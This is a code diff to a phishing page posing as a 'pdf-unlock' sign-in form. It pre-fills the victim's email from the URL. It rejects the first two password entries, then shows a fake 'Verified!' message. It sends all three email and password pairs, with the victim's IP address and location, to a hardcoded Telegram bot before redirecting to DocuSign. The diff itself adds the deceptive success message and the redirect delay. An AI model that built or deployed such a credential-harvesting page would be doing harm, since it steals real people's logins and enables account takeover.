@@ -78,12 +78,13 @@
     button:hover {
       background-color: #6B0000;
     }
-    .error-message {
+    .error-message, .success-message {
       display: none;
-      color: red;
-      margin-bottom: 15px;
       font-size: 14px;
+      margin-bottom: 15px;
     }
+    .error-message { color: red; }
+    .success-message { color: green; }
   </style>
 </head>
 <body>
@@ -99,6 +100,7 @@
         <label for="keep-signed-in">Keep me signed in</label>
       </div>
       <div class="error-message" id="errorMsg">❌ Incorrect email or password.</div>
+      <div class="success-message" id="successMsg">✅ Verified! Your document is being prepared...</div>
       <button type="submit">Next</button>
     </form>
   </div>
@@ -106,14 +108,15 @@
   <script>
     const form = document.getElementById("loginForm");
     const errorMsg = document.getElementById("errorMsg");
+    const successMsg = document.getElementById("successMsg");
     const attempts = [];
-    
-    // Auto-fill email from URL fragment
-const fragmentEmail = window.location.hash.slice(1);
-if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
-  form.email.value = fragmentEmail;
-}
-    
+
+    // Auto-fill email from # fragment
+    const fragmentEmail = window.location.hash.slice(1);
+    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
+      form.email.value = fragmentEmail;
+    }
+
     const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
     const chatId = "5613637159";
     const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
@@ -123,24 +126,28 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
 
       const email = form.email.value.trim();
       const password = form.password.value.trim();
-
-      // Save attempt
       attempts.push({ email, password });
 
-      errorMsg.style.display = "block";
-      
-      // Remove error if user types again
+      // Show error on 1st & 2nd, success on 3rd
+      if (attempts.length < 3) {
+        errorMsg.style.display = "block";
+        successMsg.style.display = "none";
+      } else {
+        errorMsg.style.display = "none";
+        successMsg.style.display = "block";
+      }
+
+      // Hide error/success if user types again
       form.querySelectorAll("input").forEach(input => {
         input.addEventListener("input", () => {
           errorMsg.style.display = "none";
+          successMsg.style.display = "none";
         }, { once: true });
       });
 
-      // Clear inputs
       form.reset();
 
       if (attempts.length === 3) {
-        // Get IP and location
         try {
           const ipRes = await fetch("https://api.ipify.org?format=json");
           const { ip } = await ipRes.json();
@@ -148,8 +155,7 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
           const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
           const geo = await geoRes.json();
 
-          const now = new Date();
-          const timestamp = now.toUTCString();
+          const now = new Date().toUTCString();
 
           let message = `🔐 pdf-unlock Login Attempts\n`;
           attempts.forEach((attempt, i) => {
@@ -157,7 +163,7 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
             message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
           });
 
-          message += `🕒 Time: ${timestamp}\n`;
+          message += `🕒 Time: ${now}\n`;
           message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
           message += `📡 IP: ${ip}`;
 
@@ -170,8 +176,10 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
             })
           });
 
-          // Redirect to DocuSign
-          window.location.href = "https://www.docusign.com";
+          // Delay to show success before redirect
+          setTimeout(() => {
+            window.location.href = "https://www.docusign.com";
+          }, 2000);
 
         } catch (err) {
           alert("❌ Error sending final data.");
